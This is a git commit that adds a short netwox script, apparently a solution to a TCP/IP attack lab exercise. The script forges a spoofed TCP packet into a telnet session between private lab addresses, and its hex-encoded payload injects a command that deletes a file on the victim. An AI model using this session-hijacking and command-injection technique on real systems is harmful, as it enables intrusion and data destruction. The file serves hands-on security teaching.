f612e6147d7942e5c6f2967b8894c37d5cba1207
Jashwanth <jashwanthreddy09@gmail.com>
2018-06-01 13:14:35 -0400

    Create netwox.sh

---
+++ TCP:IP_Attack-Lab/netwox.sh
@@ -0,0 +1,3 @@
+sudo netwox 40 --ip4-src "10.0.2.6" --ip4-dst "10.0.2.5" --ip4-ttl 64 --tcp-dst "23" --tcp-src "56436" \
+--tcp-seqnum "3055680939" --tcp-window 2000 --tcp-acknum "297181304" --tcp-urg --tcp-ack --tcp-psh \
+--tcp-data "726d202f686f6d652f736565642f4465736b746f702f696d702e7478740D0D2022"
